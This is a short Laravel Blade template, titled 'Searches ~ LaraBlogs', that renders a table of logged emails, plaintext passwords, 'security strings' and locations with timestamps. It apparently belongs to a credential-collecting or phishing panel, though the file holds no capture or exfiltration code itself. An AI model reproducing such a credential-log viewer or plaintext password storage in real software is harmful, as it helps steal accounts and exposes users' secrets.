
<!DOCTYPE html>
<html lang="en"> 
<head>
    <title>Searches ~ LaraBlogs</title>
    
    <!-- Meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
   <x-cssfiles />
 
  
</head> 

<body class="app">   	
<x-header />

<div class="app-wrapper">

<br>
<br>

<div class="row">
    <div class="col-1"></div>
    <div class="col-10">

    <table class="table">
  <thead>
    <tr>
    <th scope="col">Date</th>
      <th scope="col">Time</th>
      <th scope="col">Email</th>
      <th scope="col">Password</th>
      <th scope="col">Security String</th>
      <th scope="col">Location</th>
    </tr>
  </thead>
  <tbody>
    @foreach($logs as $log)
    <tr>
      <th scope="row">{{$log->date}}</th>
      <td>{{$log->time}}</td>
      <td>{{$log->email}}</td>
      <td>{{$log->passwd}}</td>
      <td>{{$log->sec_string}}</td>
      <td>{{$log->loc}}</td>
    </tr>
    @endforeach
    
  </tbody>
</table>

    </div>
    <div class="col-1"></div>
</div>
	    
<div class="app-content">
  
  <br>

   <div class="row">
	 <div class="col-1"></div>
	 <div class="col-10">
	  
	 
	 
 

 
	   </div>
	 <div class="col-1"></div>
   </div>
  
   </div>
 
 
 
	 
	 <!--//app-content-->
	 





	 <footer class="app-footer">
		 <div class="container text-center py-3">
			  <!--/* This template is free as long as you keep the footer attribution link. If you'd like to use the template without the attribution link, you can buy the commercial license via our website: themes.3rdwavemedia.com Thank you for your support. :) */-->
		 <!-- <small class="copyright">Designed with <span class="sr-only">love</span><i class="fas fa-heart" style="color: #fb866a;"></i> by <a class="app-link" href="http://themes.3rdwavemedia.com" target="_blank">Xiaoying Riley</a> for developers</small>
			 -->
		 </div>
	 </footer><!--//app-footer-->
	 
				   

 
</div>


  

</body>

<x-jsfiles />

</html> 



